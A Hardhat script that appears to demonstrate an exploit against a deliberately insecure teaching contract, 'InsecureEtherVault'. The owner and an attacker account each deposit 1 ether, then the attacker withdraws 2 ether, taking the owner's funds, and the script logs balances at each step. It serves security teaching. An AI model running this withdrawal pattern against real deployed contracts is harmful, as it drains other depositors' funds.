import { ethers } from "hardhat";

async function main() {
  let time = Date.now();
  const AMOUNT = ethers.parseEther("1"); //bignumber

  let vault;
  const [owner, attacker] = await ethers.getSigners();
  vault = await ethers.getContractAt(
    "InsecureEtherVault", 
    "0x1613beB3B2C4f22Ee086B2b38C1476A3cE7f78E8",  
    // make sure this address is the address you just deployed
    attacker
  );
  console.log("--- attacker deposit ---");

  const txn1 = await vault.connect(owner).deposit({value: AMOUNT});
  await txn1.wait(1);
  console.log("vault balance: ", await vault.connect(attacker).getEtherBalance());
  console.log("owner balance: ", await vault.getUserBalance(owner.address));

  console.log("--- attacker deposit ---");

  const txn2 = await vault.connect(attacker).deposit({value: AMOUNT});
  await txn2.wait(1);
  console.log("vault balance: ", await vault.connect(attacker).getEtherBalance());
  console.log("attacker balance: ", await vault.getUserBalance(attacker.address));

  console.log("--- attacker withdraw ---");
  const txn3 = await vault.connect(attacker).withdraw(2n * AMOUNT);
  await txn3.wait(1);
  console.log("vault balance: ", await vault.connect(attacker).getEtherBalance());
  console.log("attacker balance: ", await vault.getUserBalance(attacker.address));

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
